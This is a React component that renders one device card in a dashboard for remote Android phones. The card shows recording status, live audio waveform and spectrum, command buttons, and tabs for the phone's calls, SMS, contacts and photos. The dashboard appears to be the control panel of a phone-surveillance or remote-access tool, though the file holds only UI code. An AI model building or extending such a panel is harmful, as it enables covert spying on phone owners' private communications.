'use client';

import { useRef, useEffect } from 'react';
import type { Device } from '@/types';
import { HealthGrid } from './HealthGrid';
import { ControlButtons } from './ControlButtons';
import { AudioVisualizer } from './AudioVisualizer';
import { VUMeter } from './VUMeter';
import { PhotoGallery } from './PhotoGallery';
import { DeviceTabs } from './DeviceTabs';

interface DeviceCardProps {
  device: Device;
  sendCommand: (deviceId: string, command: string, data?: any) => boolean;
  wsConnected: boolean;
}

export function DeviceCard({ device, sendCommand, wsConnected }: DeviceCardProps) {
  const waveformCanvasRef = useRef<HTMLCanvasElement>(null);
  const spectrumCanvasRef = useRef<HTMLCanvasElement>(null);

  return (
    <div className="device-card">
      {/* Header */}
      <div className="flex justify-between items-start mb-1">
        <h3 className="text-[15px] font-bold text-teal-light flex items-center gap-2">
          <span className="w-2.5 h-2.5 rounded-full bg-green shadow-glow-green animate-pulse" />
          {device.deviceName || device.deviceId}
        </h3>
        <span 
          className={`text-[10px] font-bold tracking-wider px-3 py-0.5 rounded-full border transition-all ${
            device.isRecording
              ? 'bg-red/15 text-rose-300 border-red/35 animate-rec-pulse'
              : 'bg-green/10 text-green-light border-green/30'
          }`}
        >
          {device.isRecording ? '● REC' : 'ONLINE'}
        </span>
      </div>

      {/* Device Meta */}
      <p className="text-[11px] text-text-dim font-mono mb-2.5 mt-0.5">
        {device.model || 'Unknown'} • {device.brand || 'Unknown'} • Android {device.androidVersion || '?'}
      </p>

      {/* Network Badge */}
      {device.networkType && (
        <div className="flex justify-end mb-2.5 -mt-0.5">
          <span 
            className={`text-[10px] font-bold tracking-wider px-2 py-0.5 rounded-full border ${
              device.networkType === 'WiFi' 
                ? 'bg-blue/10 text-blue-300 border-blue/30'
                : 'bg-amber/15 text-amber border-amber/55'
            }`}
          >
            {device.networkType}
          </span>
        </div>
      )}

      {/* Health Grid */}
      <HealthGrid device={device} />

      {/* Audio Visualizer */}
      <div className="canvas-wrap">
        <span className="absolute top-1.5 left-2.5 text-[9px] font-bold tracking-widest uppercase text-text-dim">
          Waveform
        </span>
        <canvas ref={waveformCanvasRef} className="w-full h-[60px]" />
      </div>

      {/* Spectrum Visualizer */}
      <div className="canvas-wrap freq">
        <span className="absolute top-1.5 left-2.5 text-[9px] font-bold tracking-widest uppercase text-text-dim">
          Spectrum
        </span>
        <canvas ref={spectrumCanvasRef} className="w-full h-[78px]" />
      </div>

      {/* VU Meter */}
      <VUMeter level={device.audioLevel || 0} />

      {/* Control Buttons */}
      <ControlButtons 
        device={device} 
        sendCommand={sendCommand}
        wsConnected={wsConnected}
      />

      {/* Tabs: Calls, SMS, Contacts, Photos */}
      <DeviceTabs device={device} />

      {/* Photo Gallery */}
      {device.photos && device.photos.length > 0 && (
        <PhotoGallery photos={device.photos} />
      )}
    </div>
  );
}
